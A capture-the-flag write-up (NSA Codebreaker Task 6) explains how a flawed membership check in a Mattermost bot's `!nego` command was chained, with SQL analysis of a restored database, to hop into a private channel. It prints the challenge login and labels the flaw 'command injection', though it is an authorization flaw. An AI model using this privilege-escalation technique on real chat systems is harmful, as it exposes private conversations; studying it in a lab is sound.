# Task 6 - (Mattermost Channel Access)

> This high visibility investigation has garnered a lot of agency attention. Due to your success, your team has designated you as the lead for the tasks ahead. Partnering with CNO and CYBERCOM mission elements, you work with operations to collect the persistent data associated with the identified Mattermost instance. Our analysts inform us that it was obtained through a one-time opportunity and we must move quickly as this may hold the key to tracking down our adversary! We have managed to create an account but it only granted us access to one channel. The adversary doesn't appear to be in that channel.

> We will have to figure out how to get into the same channel as the adversary. If we can gain access to their communications, we may uncover further opportunity.

> You are tasked with gaining access to the same channel as the target. The only interface that you have is the chat interface in Mattermost!

---

## Downloads

- **Mattermost instance:** `volumes.tar.gz`
- **User login:** `user.txt`

---

## Prompt

- **Submit a series of commands, one per line, given to the Mattermost server which will allow you to gain access to a channel with the adversary.**

---

## Writeup

This task was relatively straightforward and took approximately 30 minutes to complete. It involved analyzing the Mattermost bot plugins to discover a command injection vulnerability.

### Initial Analysis

I began by extracting the provided archive and examining the contents:
```bash
~/Downloads ❯ tar -xvf volumes.tar.gz

~/Downloads ❯ cat user.txt
cynicaltuna4:ViPgVWPQheHshaPs
```

Next, I explored the extracted directory structure:
```bash
~/Downloads ❯ cd volumes
~/Downloads/volumes ❯ ls
bot  db
~/Downloads/volumes ❯ cd bot
~/Downloads/volumes/bot ❯ ls
bot.py  malware_database.py  mmpy_bot_monkeypatch.py  plugin_admin.py  plugin_managechannel.py  plugin_onboarding.py  plugin_sales.py
```

The `bot` directory contained several Python scripts implementing various Mattermost bot plugins. After reviewing each plugin, I discovered the `!nego` command in `plugin_sales.py`.

### Vulnerability Discovery

The `!nego` command is designed to create private negotiation channels between users. Examining the code revealed a critical vulnerability in how it handles user inputs and channel membership verification.

The command accepts four parameters: a channel name, and three usernames (where the fourth must be a moderator with the `mod_` prefix). The function performs the following operations:

1. Creates a new private channel (or unarchives an existing archived channel)
2. Verifies that all four users (the command sender plus the three specified users) exist
3. **Critically**, checks that all four users are members of the **current channel** where the command is executed:
```python
current_members_ids = [m['user_id'] for m in self.driver.channels.get_channel_members(message.channel_id)]
if not (user_ids[0] in current_members_ids and user_ids[1] in current_members_ids and
        user_ids[2] in current_members_ids and user_ids[3] in current_members_ids):
    self.driver.reply_to(message, f"Could not find users")
    return
```
4. If all checks pass, adds all four users to the newly created/unarchived channel

**The vulnerability** lies in the fact that the verification only checks membership in the **source channel** (where the command is executed), not the **destination channel**. This creates a channel hopping exploit:

- When you execute `!nego` from the Public channel, you can create a new private channel and add yourself plus 3 other users from Public
- Once in that new private channel, you can execute `!nego` **again** from within it, as long as you can find 3 other users (including a moderator) who are also in that channel
- By chaining multiple `!nego` commands, you can progressively "hop" through channels: **Public → Channel A → Channel B → ... → Target Channel**

The only constraints are:
1. You need 4 users total (including yourself and a moderator) present in each source channel
2. The moderator must have a username starting with `mod_`
3. The target users must exist in the current channel before you can add them to a new channel

This allows an attacker with access to only one channel to systematically gain access to any private channel in the system, as long as there exists a path of overlapping user memberships connecting them.

### Exploitation Strategy

To exploit the `!nego` vulnerability, I needed to understand how the function works and what constraints it has. The key insight is that the `!nego` command:

1. Creates a new private channel (or unarchives an existing one)
2. Adds four users to that channel: the command invoker and three specified users
3. Critically, verifies that all four users are members of the **current channel** where the command is executed

The vulnerability lies in the fact that once added to a new channel, you can use `!nego` again from that channel to hop to another channel, as long as you can find overlapping user memberships. This allows for channel hopping: Public → Channel A → Channel B → ... → Target Channel.

### Database Analysis

I identified the PostgreSQL version being used:
```bash
~/Downloads/volumes/db/var/lib/postgresql/data ❯ cat PG_VERSION
13
```

I then set up a local PostgreSQL instance to analyze the Mattermost database and plan my exploitation path:
```bash
┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker run -d \
  --name mattermost-db \
  -e POSTGRES_HOST_AUTH_METHOD=trust \
  postgres:13

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker stop mattermost-db

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker cp volumes/db/var/lib/postgresql/data/. mattermost-db:/var/lib/postgresql/data/

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker start mattermost-db

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker exec -it mattermost-db psql -U mmuser -d mattermost
```

First, I identified all users in the system and confirmed my starting position:
```sql
mattermost=# SELECT username, email, roles FROM users;
```

This revealed 20 users, including my account `cynicaltuna4` and several moderator accounts (prefixed with `mod_`).

Next, I verified which channel I currently had access to:
```sql
mattermost=# SELECT c.name, c.displayname, c.type 
FROM channels c
JOIN channelmembers cm ON c.id = cm.channelid
JOIN users u ON cm.userid = u.id
WHERE u.username = 'cynicaltuna4';
```

As expected, I only had access to the `public` channel. I then identified all members of this channel:
```sql
mattermost=# SELECT u.username 
FROM channels c
JOIN channelmembers cm ON c.id = cm.channelid
JOIN users u ON cm.userid = u.id
WHERE c.name = 'public'
ORDER BY u.username;
```

The public channel contained 9 users: `affectedorange68`, `awedbasmati13`, `cynicaltuna4`, `dreadfulantelope98`, `malbot`, `mod_stressedcheese82`, `pacifiedsnail22`, `troubledllama32`, and `unhappyeland26`.

### Finding the Hop Path

To reach the adversary's channel, I needed to find a chain of private channels where each successive channel shared at least 4 users with the previous one (including myself and a moderator). I developed SQL queries to identify viable hop targets.

**Step 1: Finding the first hop from Public**
```sql
SELECT c.name, c.displayname,
  9 - (SELECT COUNT(*) 
   FROM channelmembers cm 
   WHERE cm.channelid = c.id 
   AND cm.userid IN (
     SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='public')
   )) as missing_public_members,
  (SELECT string_agg(u.username, ', ')
   FROM users u
   WHERE u.id IN (
     SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='public')
   )
   AND u.id NOT IN (
     SELECT userid FROM channelmembers WHERE channelid = c.id
   )) as available_users
FROM channels c
WHERE c.type = 'P'
AND 9 - (SELECT COUNT(*) 
     FROM channelmembers cm 
     WHERE cm.channelid = c.id 
     AND cm.userid IN (
       SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='public')
     )) >= 4
ORDER BY missing_public_members DESC, c.name;
```

This query revealed `channel17298` as a viable first hop, requiring 4 users from public: `mod_stressedcheese82`, `affectedorange68`, `pacifiedsnail22`, and `cynicaltuna4`.

**Step 2: Finding subsequent hops**

I repeated this process, simulating the channel membership after each `!nego` command. For each hop, I used a CTE (Common Table Expression) to model what the user pool would look like after gaining access to the new channel:
```sql
WITH channel17298_after_nego AS (
  SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='channel17298')
  UNION
  SELECT id FROM users WHERE username IN ('cynicaltuna4', 'affectedorange68', 'pacifiedsnail22', 'mod_stressedcheese82')
)
SELECT c.name, c.displayname, ...
```

This analysis revealed the complete exploitation path:
- **Public** → **channel17298** (using: `cynicaltuna4`, `affectedorange68`, `pacifiedsnail22`, `mod_stressedcheese82`)
- **channel17298** → **channel38107** (using: `cynicaltuna4`, `pacifiedsnail22`, `mildlapwing47`, `mod_innocentrelish97`)
- **channel38107** → **channel17132** (using: `cynicaltuna4`, `mildlapwing47`, `sorebuzzard67`, `mod_sugarythrushe15`)
- **channel17132** → **channel26325** (using: `cynicaltuna4`, `sorebuzzard67`, `meremussel4`, `mod_sugarycrane58`)

### Submission

With the exploitation path identified through database analysis, I submitted the following series of commands to the NSA Codebreaker platform:
```
!nego channel17298 affectedorange68 pacifiedsnail22 mod_stressedcheese82 
!nego channel38107 pacifiedsnail22 mildlapwing47 mod_innocentrelish97 
!nego channel17132 mildlapwing47 sorebuzzard67 mod_sugarythrushe15 
!nego channel26325 meremussel4 sorebuzzard67 mod_sugarycrane58
```

It's important to note that the order matters, as looking back at the !nego command, it requires the mod user to be last.

<p align="center">
<img src="images/badge6.png" alt="Badge" width="300"/>
</p>

**Success!** By exploiting the `!nego` command's membership verification logic and carefully mapping out user overlaps between channels, I successfully gained access to the adversary's private channel.
